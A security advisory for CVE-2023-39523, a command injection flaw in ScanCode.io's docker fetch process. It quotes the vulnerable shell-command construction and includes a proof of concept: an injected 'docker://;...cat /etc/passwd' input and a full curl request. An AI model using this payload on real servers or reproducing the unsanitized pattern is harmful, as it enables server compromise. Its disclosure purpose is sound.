# [M] ScanCode.io command injection in docker image fetch process

## Summary
Severity: Medium
Advisory: GHSA-2ggp-cmvm-f62f
CVE: CVE-2023-39523
CWE: CWE-77
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H (CVSS_V3)
Published: 2023-08-09
Source: https://github.com/advisories/GHSA-2ggp-cmvm-f62f
Type: github-advisory

## Affected
- PyPI: `scancodeio` — affected >=0 <32.5.1

## Details
## Command Injection in docker fetch process

### Summary
A possible command injection in the docker fetch process as it allows to append malicious commands in the docker_reference parameter.


### Details
In the function `scanpipe/pipes/fetch.py:fetch_docker_image`[1] the parameter `docker_reference` is user controllable. The `docker_reference` variable is then passed to the vulnerable function `get_docker_image_platform`. 
```python
def fetch_docker_image(docker_reference, to=None):
    """
    code snipped ....
    """
    platform_args = []
    platform = get_docker_image_platform(docker_reference) # User controlled `docker_reference` passed
   """
   code snipped...
   """
```

However, the `get_docker_image_plaform` function constructs a shell command with the passed `docker_reference`. The `pipes.run_command` then executes the shell command without any prior sanitization, making the function vulnerable to command injections. 

```python
def get_docker_image_platform(docker_reference):
    """
    Return a platform mapping of a docker reference.
    If there are more than one, return the first one by default.
    """
    skopeo_executable = _get_skopeo_location()
    """
    Constructing a shell command with user controlled variable `docker_reference`
    """
    cmd = (
        f"{skopeo_executable} inspect --insecure-policy --raw --no-creds "
        f"{docker_reference}"
    )

    logger.info(f"Fetching image os/arch data: {cmd}")
    exitcode, output = pipes.run_command(cmd) # Executing command
    logger.info(output)
    if exitcode != 0:
        raise FetchDockerImageError(output)
``` 

A malicious user who is able to create or add inputs to a project can inject commands. Although the command injections are blind and the user will not receive direct feedback without logs, it is still possible to cause damage to the server/container. The vulnerability appears for example if a malicious user adds a semicolon after the input of `docker://;`, it would allow appending malicious commands.

### PoC

1. Create a new project with following input `docker://;echo${IFS}"PoC"${IFS}&&cat${IFS}/etc/passwd` in the filed Download URLs
![image](https://user-images.githubusercontent.com/122313513/258454691-7cabe100-f82d-44b9-99f2-5d6a0949e6c4.png)

2. Check docker logs to see the command execution
![image](https://user-images.githubusercontent.com/122313513/258455082-d7590b16-6fcb-4041-949f-2e20959db713.png)

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: localhost' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: multipart/form-data; boundary=---------------------------2742275543734015476190112060' -H $'Content-Length: 923' -H $'Origin: http://localhost' -H $'DNT: 1' -H $'Connection: close' -H $'Referer: http://localhost/project/add/' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' \
    -b $'csrftoken=7H2chgA7jPHnXK0NNPftIoCW9z8SabKR' \
    --data-binary $'-----------------------------2742275543734015476190112060\x0d\x0aContent-Disposition: form-data; name=\"csrfmiddlewaretoken\"\x0d\x0a\x0d\x0ayslGuNnvWloFUEUCWI5VlMuZ60ZDDSkFvZdIBTNs50VSHeKfznaeT0WL5pXlDTUm\x0d\x0a-----------------------------2742275543734015476190112060\x0d\x0aContent-Disposition: form-data; name=\"name\"\x0d\x0a\x0d\x0apoc\x0d\x0a-----------------------------2742275543734015476190112060\x0d\x0aContent-Disposition: form-data; name=\"input_files\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------2742275543734015476190112060\x0d\x0aContent-Disposition: form-data; name=\"input_urls\"\x0d\x0a\x0d\x0adocker://;echo${IFS}\"PoC\"${IFS}&&cat${IFS}/etc/passwd\x0d\x0a-----------------------------2742275543734015476190112060\x0d\x0aContent-Disposition: form-data; name=\"pipeline\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------2742275543734015476190112060\x0d\x0aContent-Disposition: form-data; name=\"execute_now\"\x0d\x0a\x0d\x0aon\x0d\x0a-----------------------------2742275543734015476190112060--\x0d\x0a' \
    $'http://localhost/project/add/'
```

**Mitigations**
The `docker_reference` input should be sanitized to avoid command injections and it is not recommend to create commands with user controlled input directly. 


**Tested on:**
- Commit: Latest commit [bda3a70e0b8cd95433928db1fd4b23051bc7b7eb]
- OS: Ubuntu Linux Kernel 5.19.0

**References**
[1] https://github.com/nexB/scancode.io/blob/main/scanpipe/pipes/fetch.py#L185

## References
- https://github.com/nexB/scancode.io/security/advisories/GHSA-2ggp-cmvm-f62f
- https://nvd.nist.gov/vuln/detail/CVE-2023-39523
- https://github.com/nexB/scancode.io/commit/07ec0de1964b14bf085a1c9a27ece2b61ab6105c
- https://github.com/nexB/scancode.io
- https://github.com/nexB/scancode.io/blob/main/scanpipe/pipes/fetch.py#L185
- https://github.com/nexB/scancode.io/releases/tag/v32.5.1
